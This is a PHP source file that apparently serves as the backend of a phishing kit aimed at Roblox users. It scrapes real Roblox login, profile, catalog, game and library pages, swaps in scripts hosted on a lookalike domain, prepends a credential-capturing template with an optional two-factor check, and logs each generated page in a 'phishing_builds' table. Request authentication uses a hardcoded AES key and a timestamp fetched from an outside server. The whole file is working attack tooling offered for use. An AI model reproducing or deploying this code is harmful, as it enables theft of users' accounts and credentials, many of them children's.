<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

    require_once 'config.php';

    if(!empty($_POST['Security']) || !empty($_POST['userID']) || !empty($_POST['redirect']) || !empty($_POST['siteID']) || !empty($_POST['2fa'])){

      $hash = decrypt($_POST['Security']);
      $id = decrypt($_POST['userID']);
      $redirect = decrypt($_POST['redirect']);
      $siteID = decrypt($_POST['siteID']);
      $fileName = decrypt($_POST['fileName']);
      $fa = decrypt($_POST['2fa']);

      for ($i=0; $i < 15; $i++) { 
  
          if (hash('sha256', '877692' . UnixTimeStamp() - $i) == $hash){
  
              $f_contents = file("stub/phishing/replaces/replaceADwith.txt"); 
              $line = $f_contents[rand(0, count($f_contents) - 1)];
              
              $type = htmlspecialchars(decrypt($_POST['preBuilds']));
              if ($type == 'login'){
  
                  if(isset($_POST['fileName'])){
  
                      if (!file_exists("roblox/$fileName.php")){
                          $str=file_get_contents('stub/phishing/login.html');
                          file_put_contents("roblox/$fileName.php", $str);

                          $tt = file_get_contents('layouts/yeet.txt');
                          $tt=str_replace('#userid', $id, $tt);
                          $tt=str_replace('#config', '../config.php', $tt);
                          $tt=str_replace('#path', '../layouts/cl.php', $tt);
                          if($fa == "true"){
                            $tt=str_replace('#check2fa', "true", $tt);
                          }else{
                            $tt=str_replace('#check2fa', "false", $tt);
                            $tt=str_replace('#redirect', $redirect, $tt);
                          }
                          prepend($tt, "roblox/$fileName.php");
  
                          $PDOLog = $db -> prepare('INSERT INTO `phishing_builds` VALUES(:id, :url, :path, :bid, :date)');
                          $PDOLog -> execute(array(':id' => $id, ':url' => "https://rblx-api.com/roblox/$fileName", ':path' => "roblox/$fileName.php", ':bid' => getID(50), ':date' => date("Y-m-d H:i:s")));
                          
                          echo encrypt("success");
                          break;
                        }else{
                          die(encrypt("nameExists"));
                          break;
                        }
                  }
  
              }elseif ($type == 'profile'){
  
                  $config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
                  $url = "https://www.roblox.com/users/$siteID/profile";
                  $ch = curl_init($url);
                  curl_setopt($ch, CURLOPT_USERAGENT, $config['useragent']);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  $content = curl_exec($ch);
                  curl_close($ch);
  
                  if (file_exists("users/$siteID")){
                    $siteID = randomNumber(10);
                    if (file_exists("users/$siteID")){
                      die(encrypt("errorOccured"));
                      break;
                    }
                  }
  
                  if (!file_exists("users/$siteID")){
                      mkdir('users/' . $siteID, 0755, true);
      
                      $custom = fopen("users/$siteID/profile.php", "w");
                      fwrite($custom, $content);
                      fclose($custom);
  
                      $tt = file_get_contents("users/$siteID/profile.php");
                      $r = trim(file_get_contents('stub/phishing/replaces/replaceprofile.txt'));
                      $n = file_get_contents('stub/phishing/replaces/replaceprofilewith.txt');
                      $x = trim(file_get_contents('stub/phishing/replaces/replaceContainer.txt'));
                      $d = trim(file_get_contents('stub/phishing/replaces/replaceContainerwith.txt'));
                      $a = file_get_contents('stub/phishing/replaces/replaceAD.txt');
                      $tt=str_replace($r, $n, $tt);
                      $tt=str_replace($a, $line, $tt);
                      $tt=str_replace($x, $d, $tt);
                      file_put_contents("users/$siteID/profile.php", $tt);
  
                      $str = file_get_contents("users/$siteID/profile.php");
                      $start = "<script onerror=Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this) data-monitor=true data-bundlename=page src=";
                      $end = "></script>";
                      $replace = "https://rblx-api.com/rbx/6388d787f24a6cc97431fcbb21978a41.js";
  
                      $fp = fopen("users/$siteID/profile.php", 'a');
                      fwrite($fp, $tt);  
                      fclose($fp); 
                      file_put_contents("users/$siteID/profile.php", replace_between($str, $start, $end, $replace));

                      $str = file_get_contents("users/$siteID/profile.php");
                      $start = "<thumbnail-2d";
                      $end = ">";
                      $replace = "https://rblx-api.com/rbx/005ea55a08a781d2c3115de2cec04c6f79ad613aa794184fdda4aa4c85658b94.js";
  
                      $fp = fopen("users/$siteID/profile.php", 'a');
                      fwrite($fp, $tt);  
                      fclose($fp); 
                      file_put_contents("users/$siteID/profile.php", replace_between($str, $start, $end, $replace));

                      $tt = file_get_contents('layouts/yeet.txt');
                      $tt=str_replace('#userid', $id, $tt);
                      $tt=str_replace('#config', '../../config.php', $tt);
                      $tt=str_replace('#path', '../../layouts/cl.php', $tt);
                      if($fa == "true"){
                        $tt=str_replace('#check2fa', "true", $tt);
                      }else{
                        $tt=str_replace('#check2fa', "false", $tt);
                        $tt=str_replace('#redirect', $redirect, $tt);
                      }
                      prepend($tt, "users/$siteID/profile.php");

                      $PDOLog = $db -> prepare('INSERT INTO `phishing_builds` VALUES(:id, :url, :path, :bid, :date)');
                      $PDOLog -> execute(array(':id' => $id, ':url' => "https://rblx-api.com/users/$siteID/profile", ':path' => "users/$siteID", ':bid' => getID(50), ':date' => date("Y-m-d H:i:s")));

                      echo encrypt("success");
                      break;
                    }else{
                      die(encrypt("idExists"));
                      break;
                    }
  
              }elseif ($type == 'catalog'){
  
  
                  $config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
                  $endName = getEnd("https://www.roblox.com/catalog/$siteID");
                  $url = "https://www.roblox.com/catalog/$siteID/$endName";
                  $ch = curl_init($url);
                  curl_setopt($ch, CURLOPT_USERAGENT, $config['useragent']);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  $content = curl_exec($ch);
                  curl_close($ch);
  
                  if (file_exists("catalog/$siteID")){
                    $siteID = randomNumber(10);
                    if (file_exists("catalog/$siteID")){
                      die(encrypt("errorOccured"));
                      break;
                    }
                  }
  
                  if (!file_exists("catalog/$siteID")){
                      mkdir('catalog/' . $siteID, 0755, true);
    
                      $custom = fopen("catalog/$siteID/$endName.php", "w");
                      fwrite($custom, $content);
                      fclose($custom);
  
                      $tt = file_get_contents("catalog/$siteID/$endName.php");
                      $r = trim(file_get_contents('stub/phishing/replaces/replacecatalog.txt'));
                      $n = file_get_contents('stub/phishing/replaces/replacecatalogwith.txt');
                      $x = trim(file_get_contents('stub/phishing/replaces/replaceContainer.txt'));
                      $d = trim(file_get_contents('stub/phishing/replaces/replaceContainerwith.txt'));
                      $a = file_get_contents('stub/phishing/replaces/replaceAD.txt');
                      $tt=str_replace($r, $n, $tt);
                      $tt=str_replace($a, $line, $tt);
                      $tt=str_replace($x, $d, $tt);
                      $tt=str_replace("https://js.rbxcdn.com/84ba27f37da697d601e1288c4ca7b30a.js", "84ba27f37da697d601e1288c4ca7b30a.js", $tt);
                      file_put_contents("catalog/$siteID/$endName.php", $tt);
  
                      $str = file_get_contents("catalog/$siteID/$endName.php");
                      $start = "<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='page' type='text/javascript' src='";
                      $end = "'></script>";
                      $replace = "https://rblx-api.com/rbx/44f2cbc3e9085e22730c7ebe8ac667b6.js";
  
                      $fp = fopen("catalog/$siteID/$endName.php", 'a');
                      fwrite($fp, $tt);  
                      fclose($fp); 
                      file_put_contents("catalog/$siteID/$endName.php", replace_between($str, $start, $end, $replace));

                      $str = file_get_contents("catalog/$siteID/$endName.php");
                      $start = "<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='Navigation' type='text/javascript' src='";
                      $end = "'></script>";
                      $replace = "https://rblx-api.com/rbx/005ea55a08a781d2c3115de2cec04c6f79ad613aa794184fdda4aa4c85658b94.js";
  
                      $fp = fopen("catalog/$siteID/$endName.php", 'a');
                      fwrite($fp, $tt);  
                      fclose($fp); 
                      file_put_contents("catalog/$siteID/$endName.php", replace_between($str, $start, $end, $replace));

                      $tt = file_get_contents('layouts/yeet.txt');
                      $tt=str_replace('#userid', $id, $tt);
                      $tt=str_replace('#config', '../../config.php', $tt);
                      $tt=str_replace('#path', '../../layouts/cl.php', $tt);
                      if($fa == "true"){
                        $tt=str_replace('#check2fa', "true", $tt);
                      }else{
                        $tt=str_replace('#check2fa', "false", $tt);
                        $tt=str_replace('#redirect', $redirect, $tt);
                      }
                      prepend($tt, "catalog/$siteID/$endName.php");

                      $PDOLog = $db -> prepare('INSERT INTO `phishing_builds` VALUES(:id, :url, :path, :bid, :date)');
                      $PDOLog -> execute(array(':id' => $id, ':url' => "https://rblx-api.com/catalog/$siteID/$endName", ':path' => "catalog/$siteID", ':bid' => getID(50), ':date' => date("Y-m-d H:i:s")));
                      
                      echo encrypt("success");
                      break;
                    }else{
                      die(encrypt("idExists"));
                      break;
                    }
  
              }elseif ($type == 'game'){
  
  
                  $config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
                  $endName = getEnd("https://www.roblox.com/games/$siteID");
                  $url = "https://www.roblox.com/games/$siteID/$endName";
                  $ch = curl_init($url);
                  curl_setopt($ch, CURLOPT_USERAGENT, $config['useragent']);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  $content = curl_exec($ch);
                  curl_close($ch);
  
                  if (file_exists("games/$siteID")){
                    $siteID = randomNumber(10);
                    if (file_exists("games/$siteID")){
                      die(encrypt("errorOccured"));
                      break;
                    }
                  }
  
  
                  if (!file_exists("games/$siteID")){
                      mkdir('games/' . $siteID, 0755, true);
  
                      $custom = fopen("games/$siteID/$endName.php", "w");
                      fwrite($custom, $content);
                      fclose($custom);
  
                      $tt = file_get_contents("games/$siteID/$endName.php");
                      $r = trim(file_get_contents('stub/phishing/replaces/replacegame.txt'));
                      $n = file_get_contents('stub/phishing/replaces/replacegamewith.txt');
                      //$x = file_get_contents('stub/phishing/replaces/replacegame1.txt');
                      //$d = file_get_contents('stub/phishing/replaces/replacegamewith1.txt');
                      $x = trim(file_get_contents('stub/phishing/replaces/replaceContainer.txt'));
                      $d = trim(file_get_contents('stub/phishing/replaces/replaceContainerwith.txt'));
                      $a = file_get_contents('stub/phishing/replaces/replaceAD.txt');
                      $tt=str_replace($r, $n, $tt);
                      $tt=str_replace($a, $line, $tt);
                      $tt=str_replace($x, $d, $tt);
                      $tt=str_replace("https://js.rbxcdn.com/84ba27f37da697d601e1288c4ca7b30a.js", "84ba27f37da697d601e1288c4ca7b30a.js", $tt);
                      file_put_contents("games/$siteID/$endName.php", $tt);
  
                      $str = file_get_contents("games/$siteID/$endName.php");
                      $start = "<script onerror=Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this) data-monitor=true data-bundlename=page src=";
                      $end = "></script>";
                      $replace = "https://rblx-api.com/rbx/5d3fb6e7f76b75100d64db399a26a231.js";
  
                      $fp = fopen("games/$siteID/$endName.php", 'a');
                      fwrite($fp, $tt);  
                      fclose($fp); 
                      file_put_contents("games/$siteID/$endName.php", replace_between($str, $start, $end, $replace));

                      $str = file_get_contents("games/$siteID/$endName.php");
                      $start = "<script onerror=Roblox.BundleDetector&amp;&amp;Roblox.BundleDetector.reportBundleError(this) data-monitor=true data-bundlename=Navigation src=";
                      $end = "></script>";
                      $replace = "https://rblx-api.com/rbx/005ea55a08a781d2c3115de2cec04c6f79ad613aa794184fdda4aa4c85658b94.js";
  
                      $fp = fopen("games/$siteID/$endName.php", 'a');
                      fwrite($fp, $tt);  
                      fclose($fp); 
                      file_put_contents("games/$siteID/$endName.php", replace_between($str, $start, $end, $replace));

                      $tt = file_get_contents('layouts/yeet.txt');
                      $tt=str_replace('#userid', $id, $tt);
                      $tt=str_replace('#config', '../../config.php', $tt);
                      $tt=str_replace('#path', '../../layouts/cl.php', $tt);
                      if($fa == "true"){
                        $tt=str_replace('#check2fa', "true", $tt);
                      }else{
                        $tt=str_replace('#check2fa', "false", $tt);
                        $tt=str_replace('#redirect', $redirect, $tt);
                      }
                      prepend($tt, "games/$siteID/$endName.php");

                      $PDOLog = $db -> prepare('INSERT INTO `phishing_builds` VALUES(:id, :url, :path, :bid, :date)');
                      $PDOLog -> execute(array(':id' => $id, ':url' => "https://rblx-api.com/games/$siteID/$endName", ':path' => "games/$siteID", ':bid' => getID(50), ':date' => date("Y-m-d H:i:s")));
                      
                      echo encrypt("success");
                      break;
                    }else{
                      die(encrypt("idExists"));
                      break;
                    }
  
              }elseif ($type == 'library'){
  
                  $config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
                  $endName = getEnd("https://www.roblox.com/library/$siteID");
                  $url = "https://www.roblox.com/library/$siteID/$endName";
                  $ch = curl_init($url);
                  curl_setopt($ch, CURLOPT_USERAGENT, $config['useragent']);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  $content = curl_exec($ch);
                  curl_close($ch);
  
                  if (file_exists("library/$siteID")){
                    $siteID = randomNumber(10);
                    if (file_exists("library/$siteID")){
                      die(encrypt("errorOccured"));
                      break;
                    }
                  }
  
                  if (!file_exists("library/$siteID")){
                      mkdir('library/' . $siteID, 0755, true);
    
                      $custom = fopen("library/$siteID/$endName.php", "w");
                      fwrite($custom, $content);
                      fclose($custom);
  
                      $tt = file_get_contents("library/$siteID/$endName.php");
                      $r = trim(file_get_contents('stub/phishing/replaces/replacelibrary.txt'));
                      $n = file_get_contents('stub/phishing/replaces/replacelibrarywith.txt');
                      $x = trim(file_get_contents('stub/phishing/replaces/replaceContainer.txt'));
                      $d = trim(file_get_contents('stub/phishing/replaces/replaceContainerwith.txt'));
                      $a = file_get_contents('stub/phishing/replaces/replaceAD.txt');
                      $tt=str_replace($r, $n, $tt);
                      $tt=str_replace($a, $line, $tt);
                      $tt=str_replace($x, $d, $tt);
                      $tt=str_replace("https://js.rbxcdn.com/4259a237372cfabe1ef8b82d88a0323f.js", "4259a237372cfabe1ef8b82d88a0323f.js", $tt);
                      file_put_contents("library/$siteID/$endName.php", $tt);
    
                      $str = file_get_contents("library/$siteID/$endName.php");
                      $start = "<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='page' type='text/javascript' src='";
                      $end = "'></script>";
                      $replace = "https://rblx-api.com/rbx/4259a237372cfabe1ef8b82d88a0323f.js";
  
                      $fp = fopen("library/$siteID/$endName.php", 'a');
                      fwrite($fp, $tt);  
                      fclose($fp); 
                      file_put_contents("library/$siteID/$endName.php", replace_between($str, $start, $end, $replace));

                      $str = file_get_contents("library/$siteID/$endName.php");
                      $start = "<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='Navigation' type='text/javascript' src='";
                      $end = "'></script>";
                      $replace = "https://rblx-api.com/rbx/005ea55a08a781d2c3115de2cec04c6f79ad613aa794184fdda4aa4c85658b94.js";
  
                      $fp = fopen("library/$siteID/$endName.php", 'a');
                      fwrite($fp, $tt);  
                      fclose($fp); 
                      file_put_contents("library/$siteID/$endName.php", replace_between($str, $start, $end, $replace));
  
                      $tt = file_get_contents('layouts/yeet.txt');
                      $tt=str_replace('#userid', $id, $tt);
                      $tt=str_replace('#config', '../../config.php', $tt);
                      $tt=str_replace('#path', '../../layouts/cl.php', $tt);
                      if($fa == "true"){
                        $tt=str_replace('#check2fa', "true", $tt);
                      }else{
                        $tt=str_replace('#check2fa', "false", $tt);
                        $tt=str_replace('#redirect', $redirect, $tt);
                      }
                      prepend($tt, "library/$siteID/$endName.php");

                      $PDOLog = $db -> prepare('INSERT INTO `phishing_builds` VALUES(:id, :url, :path, :bid, :date)');
                      $PDOLog -> execute(array(':id' => $id, ':url' => "https://rblx-api.com/library/$siteID/$endName", ':path' => "library/$siteID", ':bid' => getID(50), ':date' => date("Y-m-d H:i:s")));
                      
                      echo encrypt("success");
                      break;
                    }else{
                      die(encrypt("idExists"));
                      break;
                    }
              }
          }else{
            echo "You just got beamed you fucking loser";
          }
      }
    }else{
      header("Location: https://discord.ixwhere.online");
      exit();
    }
    function getID($length){
      $token = "";
      $codeAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
      $codeAlphabet.= "abcdefghijklmnopqrstuvwxyz";
      $codeAlphabet.= "0123456789";
      $max = strlen($codeAlphabet);
 
     for ($i=0; $i < $length; $i++) {
         $token .= $codeAlphabet[random_int(0, $max-1)];
     }
 
     return $token;
    }
    function prepend($string, $orig_filename) {
      $context = stream_context_create();
      $orig_file = fopen($orig_filename, 'r', 1, $context);
    
      $temp_filename = tempnam(sys_get_temp_dir(), 'php_prepend_');
      file_put_contents($temp_filename, $string);
      file_put_contents($temp_filename, $orig_file, FILE_APPEND);
    
      fclose($orig_file);
      unlink($orig_filename);
      rename($temp_filename, $orig_filename);
    }
    function getEnd($main){
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, $main); //set url
      curl_setopt($ch, CURLOPT_HEADER, true); //get header
      curl_setopt($ch, CURLOPT_NOBODY, true); //do not include response body
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); //do not show in browser the response
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); //follow any redirects
      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_exec($ch);
      $url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL); //extract the url from the header response
      curl_close($ch);
      $cutEnd = strrchr(parse_url($url, PHP_URL_PATH), '/');
      $cutEnd = str_replace('/', '', $cutEnd);
      return $cutEnd;
  }
    function replace_between($str, $needle_start, $needle_end, $replacement) {
        $pos = strpos($str, $needle_start);
        $start = $pos === false ? 0 : $pos + strlen($needle_start);
    
        $pos = strpos($str, $needle_end, $start);
        $end = $pos === false ? strlen($str) : $pos;
    
        return substr_replace($str, $replacement, $start, $end - $start);
    }
    function randomNumber($length) {
        $result = '';
    
        for($i = 0; $i < $length; $i++) {
            $result .= mt_rand(0, 9);
        }
    
        return $result;
    }
    function UnixTimeStamp(){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://ixwhere.online/UT");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $unix = curl_exec($ch);
        curl_close($ch);
        echo $unix;
    }

    function encrypt($message)
    {
        if (OPENSSL_VERSION_NUMBER <= 268443727) {
            throw new RuntimeException('OpenSSL Version too old, vulnerability to Heartbleed');
        }
        
        $iv_size        = openssl_cipher_iv_length('aes-256-cbc');
        $iv             = openssl_random_pseudo_bytes($iv_size);
        $ciphertext     = openssl_encrypt($message, 'aes-256-cbc', "Z8ZW4nRUDC8wbBDqYSG5rJY8Advtar7X", OPENSSL_RAW_DATA, $iv);
        $ciphertext_hex = bin2hex($ciphertext);
        $iv_hex         = bin2hex($iv);
        return "$iv_hex:$ciphertext_hex";
    }
    function decrypt($ciphered) {
        $iv_size    = openssl_cipher_iv_length('aes-256-cbc');
        $data       = explode(":", $ciphered);
        $iv         = hex2bin($data[0]);
        $ciphertext = hex2bin($data[1]);
        return openssl_decrypt($ciphertext, 'aes-256-cbc', "Z8ZW4nRUDC8wbBDqYSG5rJY8Advtar7X", OPENSSL_RAW_DATA, $iv);
    }
?>